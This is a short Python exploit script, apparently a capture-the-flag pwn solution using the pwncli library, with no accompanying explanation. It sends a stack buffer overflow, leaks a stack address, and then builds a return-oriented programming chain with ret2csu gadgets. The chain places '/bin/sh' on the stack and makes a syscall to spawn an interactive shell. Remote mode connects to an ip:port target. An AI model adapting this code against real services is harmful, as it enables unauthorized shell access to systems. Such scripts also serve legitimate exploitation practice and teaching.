#!/usr/bin/env python3
# Date: 2025-07-06 11:06:37
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

csu1=0x40059A
csu2=0x400580
gad1=0x4004E2
main=0x40051D
rdi=0x00000000004005a3
syscall=0x400517
p1415=0x00000000004005a0
s(b'a'*16+p64(main))
r(0x20)

stack=u64(r(8))
call_addr=stack-0x100+16
bin_str=stack-0x110+16
r(8)

p=b'a'*16+p64(rdi)+p64(bin_str)+p64(gad1)+p64(csu1)+p64(0)+p64(0)+p64(call_addr)+p64(0)+p64(0)+p64(bin_str&0xffffffff)+p64(csu2)
p+=b'/bin/sh\x00'+p64(rdi)+p64(p1415)+p64(rdi)+p64(bin_str)+p64(syscall)
s(p)

print(hex(stack))
ia()
